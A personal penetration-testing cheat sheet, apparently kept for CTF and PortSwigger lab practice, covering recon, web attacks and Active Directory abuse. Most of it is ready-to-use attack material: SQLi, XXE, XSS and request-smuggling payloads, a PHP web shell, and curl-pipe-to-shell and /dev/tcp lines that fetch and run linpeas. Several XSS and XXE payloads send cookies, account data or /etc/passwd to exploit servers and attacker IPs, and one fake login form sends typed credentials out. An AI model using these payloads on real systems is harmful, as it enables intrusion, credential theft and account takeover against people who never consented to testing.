# Tuto

```bash
exegol start -cwd -fs --disable-shared-timezones CTF
```

## Discovery

<details>

Command for optimal informations :

```bash
nmap -Pn -sC -sV -p- -T4 -vvvv --reason "$TARGET"
```

- -Pn: This option tells Nmap to skip the host discovery phase. Normally, Nmap first checks to see if a host is online before scanning it, but -Pn assumes the host is up.
- -sC: This enables the default script scan, which uses a set of Nmap scripts (NSE scripts) to perform additional service detection, vulnerability detection, and other tasks.
- -sV: This option enables version detection, which tries to determine the version of the services running on open ports.
- -p-: This tells Nmap to scan all 65535 ports, not just the default 1000 ports.
- -T4: This sets the timing template to level 4 (Aggressive). Timing templates control the speed of the scan, with higher numbers being faster but more likely to be detected and blocked by firewalls and intrusion detection systems.
- -vvvvv: This sets the verbosity level to 5, the highest level. This provides very detailed output during the scan process.b
- --reason: This tells Nmap to include the reason each port is in its state (open, closed, filtered, etc.) in the output. This can provide additional insight into why a port is reported in a particular state.

## Fuzzing

### fuff

Fuzz for pages :

`ffuf -c -w /opt/seclists/Discovery/Web-Content/big.txt -u "http://$TARGET/FUZZ"`

Fuzz for subdomain using the header host :

`ffuf -c -w /opt/seclists/Discovery/Web-Content/list_of_ports.txt -u "http://$TARGET/" -H "Host: FUZZ.$TARGET"`

Fuzz for username (use the regex):

`ffuf -c -w ./usernames.txt  -X POST -d "username=FUZZ&password=test" -u "http://$TARGET/login" -fr "Invalid username"`

Fuzz for IP in SSRF :

`ffuf -c -u "$TARGET" -X POST -d "stockApi=http://192.168.0.FUZZ:8080/admin" -w <(seq 1 1 254) -mc 200`

To avoid false positive, use of filters :

- fw : to filter by the amount of words
- fl : to filter by the number of lines
- fs : to filter by the size of the response
- fc : to filter by the status code
- fr : to filter by the regex pattern

</details>

## Vulnerabilities

<details>

### searchsploit

`searchsploit <name + version>` to get all the potential exploits

`searchsploit -x <number>` to show the exploit
`searchsploit -p <number>` to show the path and other info

### linepeas

from your computer :

```
# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

</details>

## Web

<details>

don't forget to check the source code and config files, you can easily find some passwords !

### PHP

#### Basic Web Shell

It's important to upload a file in <name>.php, otherwhile the system don't know how to interpret it.

`<?php echo system($_GET['command']); ?>`

### OS Command Injection

Purpose of command 	Linux 	Windows
Name of current user 	whoami 	whoami
Operating system 	uname -a 	ver
Network configuration 	ifconfig 	ipconfig /all
Network connections 	netstat -an 	netstat -an
Running processes 	ps -ef 	tasklist

### HTTP parameter pollution (HPP)

Place query syntax characters like #, &, and = in your input and observe if they are encoded. If not, you might be able to replace some of the values.

Example :

```HTML
In the browser :
http://thebank.com/?to=Jake&amount=10
In the backend it became :
http://payement-gateway/?from=Attacker&to=Jake&amount=10 # the "from" is completed from the cookies.

We could abuse it like this :
http://thebank.com/?to=Jake&amount=10&from=Jake&to=Attacker
And because there is no encoding on amount, we could use our own parameters, the request in the backend will be :
http://payement-gateway/?from=Attacker&to=Jake&amount=10&from=Jake&to=Attacker
Thus, overriding the initial values of from and to
```

Example from burp academy

```
csrf=MrqMucWb11wmtIh7glu4wdLETarkxqaJ&username=administrator%23
=> field not specified, donc fuzz dessus :

ffuf -c -u https://0a6800d004ec92128054b751001e0047.web-security-academy.net/forgot-password -b "session=aENquR6wuMy69m6kT9qkFEpVtnDbMRVU" -H 'Content-Type: x-www-form-urlencoded' -d "csrf=MrqMucWb11wmtIh7glu4wdLETarkxqaJ&username=administrator%26field=FUZZ%23" -w /opt/seclists/burp-payloads/Server-side\ variable\ names.pay

username
email

On en trouve un autre dans forgetPassword.js : reset_password, donc on le test :

csrf=a6tfWRTMm5uY9fnowZ7M6Km54l168HPm&username=administrator%26field=reset_token%23

{"type":"reset_token","result":"mrlhusvq051z33yc0jzx6qmla862wfhb"}

Maintenant on visite la page ds le browser et on accès au form (tel que le fichier .js l'explique)

https://0a6800d004ec92128054b751001e0047.web-security-academy.net/forgot-password?reset_token=o6lcow5jd6zb3i994vq6vn1talfema4n
```

### ServerSide template injection

Hard to notice but can be really easy to exploit.

Basic payload : 

Tornado : `${{<%[%'"}}@{%\.#{<%=`

ERB: `<%= 67*273 %>` (18291)

Different possibility :

```HTML
{{7*7}}
${7*7}
${{7*7}}
<%= 7*7 %>
#{7*7}
```

Sometimes the SSTI affects data that you can preview on an other page : for example, in burp the updated name only show in the comments.

```Python
{{ settings.SECRET_KEY }}
```

### WebSockets

Possible to be replayed in Burp

### Auth

When BF, the time of response can be longer if it's the right username but with a very long password, where as the wrong username will have a very short answer time. Therefore you can idenify the right username by looking at long response time

Sometime you can bf even when it says you cannot.

`X-Forwarded-Host` is a header that identify the orginal host making the request, therefore it can help you intercept a response from the server

### SQLi

1. Determine the number of columns

    ```log
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--
    ```

    Or

    ```SQL
    ' UNION SELECT NULL--
    ' UNION SELECT NULL,NULL--
    ' UNION SELECT NULL,NULL,NULL--
    ```

2. Determine which column can contain string data

    ```log
    ' UNION SELECT 'a',NULL,NULL,NULL--
    ' UNION SELECT NULL,'a',NULL,NULL--
    ' UNION SELECT NULL,NULL,'a',NULL--
    ' UNION SELECT NULL,NULL,NULL,'a'--
    ```

3. Sometime the site can only return one column, you can use `||` for concat

    ```log
    ' UNION SELECT username || '~' || password FROM users--
    ' UNION SELECT NULL,CONCAT(username,password) from users
    ```

4. You might need to get the version
    
    https://portswigger.net/web-security/sql-injection/cheat-sheet

5. Use the `SELECT table_name FROM information_schema.tables` to get the table names (you can replace table_name by *)
6. Then you have the `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
7. The names can be unusal, be careful !

    ```log
    ' UNION SELECT NULL,username_sldobv||password_jkbxvi FROM users_uyrkja--
    ```

8. Oracle Specific: you always need to query from a DB :

    ```log
    ' UNION SELECT 'abc' FROM dual--
    ' UNION SELECT NULL, NULL FROM dual--
    ' UNION SELECT table_name , NULL FROM all_tables--
    ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_CONFIDENTIAL'--
    ' UNION SELECT USERNAME_PHYTSK||'@'||PASSWORD_VUSIEA, NULL FROM USERS_VMPDUF--
    ```
9. Postgres concatenate column names
    
    ```log
    ' UNION SELECT NULL,string_agg(column_name, ', ') FROM information_schema.columns WHERE table_name = 'users'--
    ```

Payload for out of band interaction :

```
'%7c%7c(SELECT%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20remote%20SYSTEM%20%22http%3a%2f%2f%27%7c%7c(SELECT%20password%20FROM%20users%20WHERE%20rownum%3d1)%7c%7c%27.h9rk28ib7fh4w9bk71bkl5zf3691xyln.oastify.com%2f%22%3e%25remote%3b]%3e')%2c'%2fl')%20FROM%20dual)%7c%7c'
```

You can also use `--tamper=htmlencode` to trigger xml

### Blind SQLi

We use `AND` instead of `UNION` to make the original query's result contingent on the truth of the test.

1. Basic idea :

   ```log
   xyz' AND '1'='1 #will return OK be
   xyz' AND '1'='2 #will return NOK
   ```

2. More difficult idea : will return OK if the first char of pass is greater than m

    ```log
    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
    ```

3. Find the password using substring

    ```log
    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
    ```

### CSRF

In burp : Engagement tool > Generate CSRF PoC

Then save the PoC on your attacker server and have the victim visit it.

Then you have to look at how the csrf work, maybe it can be used multiple times, maybe it does not depend on your session (i.e. your token works for other users)

SameSite attribute allows the web browser to send the cookie to an other site.

- Strict : Browser does not send it in any cross request (ie : you need the same site as in the bar)
- Lax : Will be send but only in Get and send from top-level navigation
- None : There is no security

The cookies can only be sent by `GET` but you can trick your browser :

```HTML
GET /my-account/change-email?_method=POST&email=a@a.fr
```

Or in a script :

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aa7007704b243cd80fa26ad004a00c8.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="_method_" value="GET" />
      <input type="hidden" name="email" value="a&#64;a&#46;a" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally.



### SSRF

Bypass filters
127.0.0.1 can be simplified as 127.1

You can also use double URL Encoding

### CORS

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. 

Exploit an XSS in a subdomain and get a page on your server:

```HTMl
<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a1b00840390e2168000fdf100e50091.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a32008d039ee22480d8fc560100008f.exploit-server.net/log?key='%2bthis.responseText; };</script>
```

Below is the payload with proper encoding :

```HTML
<script>
    document.location="http://stock.0a1b00840390e2168000fdf100e50091.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a1b00840390e2168000fdf100e50091.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a32008d039ee22480d8fc560100008f.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

### No SQL

1. Determine which characters are processed : `'` or `\'`
2. Confirme conditional behavior : `wiener' && '1'=='2` and `wiener' && '1'=='1`
   Send both request to see if the logic can impact the site
3. `administrator' && this.password.length < 30 || 'a'=='b` and try with different size to identify the right one
4. `administrator' && this.password[0]=='a`

Extract first field character by character : `"$where":"Object.keys(this)[0].match('^.{0}a.*')"`

Test the regex operator : `{"username":"admin","password":{"$regex":"^.*"}}`

If the response is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. 

### Web cache poisonning

```
"</script><script>alert(1)</script>"
```

### Web cache deception

Send a malicious URL and have the cache storing a dynamic response. You can then send a request to get the content of this precise data (ie request what have been saved in the cache).

Mostly on `HEAD`, `GET` and `OPTION`. `X-Cache` header provides information about whether a response was served from the cache.

If update `/api/my-account/foo` to `/api/my-account/foo.js` still send the same the same information, and that pages in `.js` are cached, you can have the victim to visit the page, it will be cached and you can then get the content of this page.

```js
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
```

To go even further, consider the payload `/settings/users/list;aaa.js`. The origin server uses `;` as a delimiter. The cache interprets the path as: `/settings/users/list;aaa.js`. The origin server interprets the path as: `/settings/users/list`.

To go even further. consider the example `/myaccount%3fwcd.css`:
- The cache server applies the cache rules based on the encoded path `/myaccount%3fwcd.css` and decides to store the response as there is a cache rule for the .css extension. It then decodes `%3f` to `?` and forwards the rewritten request to the origin server.
- The origin server receives the request `/myaccount?wcd.css`. It uses the `?` character as a delimiter, so it interprets the path as `/myaccount`.

Make sure that you also test encoded non-printable characters, particularly %00, %0A and %09.

```js
<script>document.location="https://0a300087043a4726b4b29a3e00230012.web-security-academy.net/my-account%23%2f%2e%2e%2fresources"</script>
```

### XXE

Basic payload looks like :

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://site_vuln.org"> ]>
<stockCheck><productId>&xxe;</productId>
<storeId>1</storeId></stockCheck>
```

You can recieve : `invalid product ID : <foldername>` because the value returned by the ssrf will be parsed

Sometime you can't control the entire doc. So you can't choose the `DOCTYPE` of an element. So you can use `<XInclude>` to create subform and get any data you want. This payload is to be tried in all the fields

```XML
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Upload an image as SVG :

```XML
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="46" x="10" y="40">&xxe;</text></svg>
```

XML parameters entites :

```XML
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0ae6003b04aaaaf8800b93ec0110002e.exploit-server.net/exploit"> %xxe; ]>
```

Host a payload on your website and send the data back : (You can trigger it with basic `GET` on your exploit server from the vicitm server)

```XML
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0af9007903f9f423806d2008019800ad.exploit-server.net/x=%file;'>">
%eval;
%exfiltrate;
```

You can trigger an error and have the content you want as part of the error :

```XML
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

You can also use local dtd and redine it the `custom_entity` :

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

### XSS

Abuse jQuery `hashchang` event. Because jQuery reads everything after the `#` and interprets it as regular code.

```JS
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

Angular

```JS
{{constructor.constructor('alert(1)')()}}<frameset><frame onload=alert(1)>
```

Reflected DOM XSS: The website might contain an eval that you can use. You need to inspect the response with Burp to understant the request. Here the `+` is to add an argument to `eval`. 

```
test\"+alert()}//
```

Some `tags` and `events` can be blocked, so you can use a wordlist to test all tags and then all events.

Or you can use custom tags :

```XML
<exploit onfocus='alert(document.cookie)' id='x' tabindex='1'>#1
```

```XML
<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text x="20" y="20">Click me</text></a></svg>
```

```XML
"><svg><animatetransform onbegin=alert(1)>
```

```XML
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

You can use this payload to exploit cannonical link tab

```XML
?%27accesskey=%27X%27onclick=%27alert(1)%27
```

### DOM XSS

You can force the page to find https string inside the payload :

```
<iframe src="https://0af00053043f734e8089033000ea0041.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print();//https://','*')">
```

`javascript:` permet d executer du code js depuis certaines balises :


```html
<a href="javascript:alert(1);//https://">Lien de test</a>

<area href="javascript:alert(1);//https://">

<iframe src="javascript:alert(1);//https://"></iframe>

<object data="javascript:alert(1);//https://"></object>

<embed src="javascript:alert(1);//https://"></embed>

<form action="javascript:alert(1);//https://">
    <input type="submit" value="Tester Formulaire">
</form>

<button form="id_form" formaction="javascript:alert(1);//https://">Bouton Action</button>
```

Bypass Json encoding :

```html
<iframe src="https://0aa60042040d64448046033a008900a7.web-security-academy.net/" 
        onload="this.contentWindow.postMessage(JSON.stringify({
            'type': 'load-channel', 
            'url': 'javascript:print();//https://'
        }), '*')">
</iframe>
```

### JWT flaws

1. Use the "None" algorithm
2. Use the "Jwk" attack, you can add the key inside the token
3. Create a key and host in on the exploit server as public jwt (left click on the key). add the jku header, make sure the kid match and sign your jwt
4. Path traversal in the kid, that can point to /dev/null, so you can sign with an empty key

### OAuth flaws

### HTTP Request Smuggling

#### CL.TE Payload for identification

```log
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

The CL will make the front-end stop the first request right before X

The back-end will wait for the next request omiting the X and thus will timeout

#### TE.CL Payload for identification

```log
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

The CL will make the front-end stop the first request right before X

Here the back-end will wait for the next request omiting the X and thus will timeout

#### TE-CL Explained

```log
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4                                          # cl is only 4 because it's the size of the bytes determinig the end of the chunk size            
Transfer-Encoding: chunked

5e                                                         #size from POST to x=1, header host seems optionnal
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0                                                          # the 0 needs to be followed by the \r\n to says it's the end of chunks and the size of 0 says it's the last chunked 


```

#### CL.TE Explained

```log
POST / HTTP/1.1
Host: 0ad90091040f71528006cbd500c4005c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 150                                    # Let burp choose the size, so the frontend send everything as one request

0                            # End of chunk for the back end, so afterwards it's another request

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost                                                  # By pass some restrictions
Content-Type: application/x-www-form-urlencoded                  # usually u can't do anything without the 3 next lines, so the content length mater
Content-Length: 2
X-Ignore: X

a
```

#### Exploit

Exemple of a request, here it's TE.CL, meaning the front end processes TE header and backend processes CL. In this request, the front end will see the size (5c) as the next request so it will keep the second part of the request and send it once again to the back-end server.

```log
POST / HTTP/1.1
Host: 0af400e304ae222b80d899c0006500b8.web-security-academy.net
Cookie: session=C0s1m5t3nZWcrtnlcAC7I9PcNNI5DOE7
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

Here it's CL.TE, don't forget to put the size of the chunked data (here it's 6 ie blabla) but this is useless os it's better not put anything 

```log
POST / HTTP/1.1
Host: 0af8003803b5e0a1830c796a00760080.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Transfer-Encoding: chunked

6
blabla
0


GET /404 HTTP/1.1
X-Ignore: X
```

#### Frontend injecting headers 

First request to see what the front end is adding, you need to find a reflected form

```log
POST / HTTP/1.1
Host: 0a10005c042624308039993b00db0094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 171

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 0a10005c042624308039993b00db0094.web-security-academy.net
Content-Length: 380

search=aaa

```

You can then make your own request.

> [!IMPORTANT]
> You need to have an bigger content length to make sure the newline added by the front end won't create a new request so your own won't disapear

```log
POST / HTTP/1.1
Host: 0a10005c042624308039993b00db0094.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 124

0

GET /admin HTTP/1.1
X-qBPZXW-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

### GraphQL

Probe endpoint to see all possible queries : left click send introspection query

This is an easy request

```
{
  "query": "{ getUser(id: 1) { username password } }"
}
```

This a parametrized request

```
"query getUsers($User: Int!) { getUser(id: $User) { username password } }",
  "variables": {
    "User": 1
  }
```

```
{
  "query": "{ getUser(id: 1) { id username } }"
}
```

Exploit csrf, and use `x-www-form-urlencoded` to send the payload

```
query=mutation+changeEmail($input:+ChangeEmailInput!)+{+changeEmail(input:+$input)+{+email+}+}&operationName=changeEmail&variables={"input":{"email":"a@a.fr"}}
```

PoC for csrF:

```HTML
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a96000604fd7b04828247d000b1004e.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#32;&#123;&#32;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#32;&#123;&#32;email&#32;&#125;&#32;&#125;" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="&#123;&quot;input&quot;&#58;&#123;&quot;email&quot;&#58;&quot;a&#64;a&#46;com&quot;&#125;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Deserialization

#### PHP Objects

PHP serialization format
PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. For example, consider a User object with the attributes:

```PHP
$user->name = "carlos";
$user->isLoggedIn = true;
```

When serialized, this object may look something like this:

```PHP
O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}
```

This can be interpreted as follows:

```
O:4:"User" - An object with the 4-character class name "User"
2 - the object has 2 attributes
s:4:"name" - The key of the first attribute is the 4-character string "name"
s:6:"carlos" - The value of the first attribute is the 6-character string "carlos"
s:10:"isLoggedIn" - The key of the second attribute is the 10-character string "isLoggedIn"
b:1 - The value of the second attribute is the boolean value true
```


### JS

#### Browser-Based Exploitation (XSS, CSRF, etc.)

It's possible to get some data and return the result to a local socket.

To encode as base 64 `btoa(document.cookie)` or to encode as URI Component : `encodeURIComponent(data)`.

> use netcat and not python3 (can't deal with the POST)

```JavaScript
fetch('http://10.10.14.117:4444', {
  method: 'POST',
  body: JSON.stringify({ cookies: document.cookie }),
});
```

You can also make an SSRF

```JavaScript
fetch('http://alert.htb/messages')
  .then(response => response.text())
  .then(data => {
    fetch('http://10.10.14.117:4444', {
      method: 'POST',
      body: data,
    });
  });
```

See also in CORS with sub domain XSS

#### Admin cookies

With the following payload, once the error occurs, it tries to use an image (GET) on the server with the cookies as a ressource.

```html
<img src=x onerror=this.src="http://10.10.14.220:8000/"+btoa(document.cookie)>
```

Sometimes, the image, don't work, you can try svg or you'll have to rely on a link, hopping it will be clicked :

```html
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/').then(response => response.text()).then(data => fetch('http://10.10.14.101:8000?data='+encodeURIComponent(data)))">Click me</a>
```

### Burp certifs

test XSS in comment and get cookies on your collaborator :

```html
<img src="x" onerror="new Image().src='http://nsjqle1hql0affuqq7uq4bilmcs4gw4l.oastify.com/?cookie=' + document.cookie;">
```

Bypass `'` encoded : `&apos;-alert(document.domain)-&apos;`

```HTML
<a href="#" onclick=&apos;-alert(document.domain)-&apos;>
```

Form inside the comments (hopping someone will be dumb enough to put his creds) :

```HTML
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

Exploit xss to make a request by finding the csrf token

```Javascript
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        var token = document.match(/name="csrf" value="(\w+)"/)[1];
        
        var changeReq = new XMLHttpRequest();
        changeReq.open("POST", "/my-account/change-email", true);
        changeReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
        changeReq.send("csrf=" + token + "&email=hacker@evil.com");
    };
    
    req.open("GET", "/my-account", true);
    req.send();
</script>
```


XSS payload when you can inject some code inside an attribute

```html
"</script><script>alert(1)</script>"
```

### Burpsuite

#### Reconnaissance

Proxy -> History -> Analyse and HighLight the interesting ones/rabbit hole/start of a transaction (login as example)

Repeater -> Rename tabs, star for the interesting ones

Try to know what every endpointd to.

#### Bruteforce

Tab Intruder/Positions  Clear all injections points and add the usefuls ones.

Attack type :

- Sniper : Chaque champ est modifié à son tour
- Battering Ram : same payload in all the injections points
- Pitchfork : each injection point have his own payload list but there ie no mixing.
- Clsuter Bomb : all possible combination

Tab Options : `grep payloads` to show only a part of the answer. `grep extract` a tester également, faire les pros and cons

### sqlmap

Sqlmap is a tool to exploit SQL vulnerabilities.

From burp, you can add `*` to specify the parameter to test.

We ue this first command to find if the page is injectable. We specify the cookies and the data sent to the form. With `-p`, we specify the parameter to try. The `--dbms` is for the type of DDB

```bash
sqlmap -u http://$TARGET/accept_cat.php --cookie="PHPSESSID=99mqrq482ubk7bcg2sgmogf35v" --data="catName=bello&catId=1" -p catName --dbms=sqlite --level=5 --risk=3
```

With this command, you can dump the content of a table : `--dump`, the table is specified with `-T "users"` and using a boolean based injection `--technique=B`.

```bash
sqlmap -u http://$TARGET/accept_cat.php --cookie="PHPSESSID=99mqrq482ubk7bcg2sgmogf35v" --data="catName=bello&catId=1" -p catName --dbms=sqlite --level=5 --risk=3 --technique=B -T "users" --threads=7 --dump
```

### Git-Dumper

With this few commands, you can restore data from the commits.

```bash
git-dumper.sh http://$TARGET/.git ./git-dump/
# Then restore the data from the commits info
cd git-dump
git reset --hard HEAD
```

### API

```
    /api
    /swagger/index.html
    /openapi.json
```

#### Parameter pollution

In a query, `#` (or `%23`) refers to section. So everything after it is not interpeted by the browser. This means that you could delete some part of the original request and replace it with your own.

You can discover some hidden parameter :

- Request : username=admin%23
- Response : field is not specified

This means, that the server is waiting for a field parameter, you can then bruteforce to find this parameter

### File Upload

#### zip slip (not the good name)

> double check the name

combine both good and malicious pdf :

```
nano legit.pdf
zip legit.zip legit.pdf

mkdir malicious_files
echo '<php system($_GET["cmd"]); ?>' > malicious_files/shell.php
zip -r malicious.zip malicious_files

cat legit.zip malicious.zip > both.zip
```

Then upload `both.pdf`, go on the url `legit.pdf`, the switch to `malicious_files/shell.php`.

</details>

## Linux

### Send mails

With the following command you can send emails to a server that is not password protected as any user you want.

```bash
swaks --to jobert@localhost --from axel@localhost --header "Subject: Exploit" --body "http://localhost:3000/axel/test" --server 127.0.0.1
```

## Active Directory

<details>

### SMB

First get some information with `enum4linux`. (It's the most complete tool IMO)

```bash
enum4linux-ng -A "$TARGET" -u "$USER" -p "$PASSWORD"
```

This might not be working. Therefore, you should use `ldapsearch`. For example, you can use the following command.

```bash
ldapsearch -x -H ldap://"$DC_HOST" -D "$USER"@"$DOMAIN" -w "$PASSWORD" -b "DC=VINTAGE,DC=HTB" "(objectClass=user)" sAMAccountName memberOf
```

The `-x` is for the 'simple authentication', used in combinaison of the -D and the -w. The `-b` is the base search. Here, this limits the query to only objects under the domain. Then, you specify a filter, here you want all the `user` object. Then, you can filter for specific attributes. Here the unique logon of the user and the groups it belongs to.

### Creds enumeration

If you have access to a list of users and a list of passwords. The `--no-bruteforce` is used if you don't want to test each password for each user.

```bash
nxc smb "$TARGET" -u users.txt -p passwords.txt --continue-on-succes --no-bruteforce
```

### Permissions Delegations

Can the user requeset ressources for(as) an other user and on which computer/service.

```bash
findDelegation.py -k -no-pass "$DOMAIN"/"$USER":"$PASSWORD" -dc-host "$DC_HOST"
```

#### To-DO : finir l explication

### Bloodhound

```bash
# très rapide (mais parfois marche pas très bien ?)
rusthound -d "$DOMAIN" -u "$USER"@"$DOMAIN" -p "$PASSWORD" --zip --ldaps --adcs --old-bloodhound

# ou bien
bloodhound-python -d certified.htb -ns 10.10.11.41 -u "$USER" -p "$PASSWORD" -c All --zip

# then
neo4j start
# wait 1 minute
bloodhound &> /dev/null &
```

Then look for `First degree object control` or `Transitive Object Control`.

### DACL abuse

It identify the users and groups that are allowed or denied access on an object.

For example, with `Owns / Write Member` we can grant any user some permissions such as `WriteMembers`.

```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal 'JUDITH.MADER' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' "$DOMAIN"/"$USER":"$PASSWORD"
[*] DACL backed up to dacledit-20241221-194223.bak
[*] DACL modified successfully!

```

Add a user in a group

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember $TargetGroup $TargetUser
[+] judith.mader added to Management
```

If you have `WriteOwner` :

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner <OBJECT_DN> <NEW_OWNER>
```

### Shadow Credentials

Active Directory user and computer objects have an attribute called `msDS-KeyCredentialLink` where raw public keys can be set.

<details>

<summary>Old way</summary>

```bash
pywhisker.py -d $DOMAIN -u $USER -p $PASSWORD --target 'MANAGEMENT_SVC' --action "add"
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 640a8a6f-755d-bd2a-f436-7bc5415bc967
[*] Updating the msDS-KeyCredentialLink attribute of MANAGEMENT_SVC
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: rCEvgXXN.pfx
[*] Must be used with password: olqnQEPOPhV3kn2jHoGR
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

### Pass the certificate

Pass the Certificate is the fancy name given to the pre-authentication operation relying on a certificate (i.e. key pair) to pass in order to obtain a TGT.

```bash
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
2024-12-22 02:49:57,837 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-12-22 02:49:57,941 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-12-22 02:49:58,011 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-12-22 02:49:58,012 minikerberos INFO     bb9f7c3c55592b8eafe07e8ed27a812add9c96066dc1ea8805e65b002da8d036
INFO:minikerberos:bb9f7c3c55592b8eafe07e8ed27a812add9c96066dc1ea8805e65b002da8d036
2024-12-22 02:49:58,028 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

#### UnPAC the hash

